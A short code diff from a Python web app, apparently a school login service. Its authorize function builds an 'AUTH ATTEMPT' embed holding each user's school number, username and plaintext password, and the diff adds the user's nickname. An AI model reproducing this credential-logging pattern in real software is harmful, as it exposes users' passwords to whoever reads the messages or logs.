@@ -114,6 +114,7 @@ def get_school_by_id(school_num: str):
 def authorize(school_num: str) -> Response:
     embed = BetterEmbed(title="AUTH ATTEMPT", color="0000ff")
     embed.add_embed_field("School number:", f"```{school_num}```", inline=False)
+    embed.add_embed_field("Nickname of user:", f"{current_user.get_field('nickname')}", inline=False)
     embed.add_embed_field("username:", f"```{request.form.get('username')}```", inline=False)
     embed.add_cleaned_field("password:", f"||```{request.form.get('pw')}```||", inline=False)
     embed.set_footer("A detailed log can be found under .cache/auth.log")
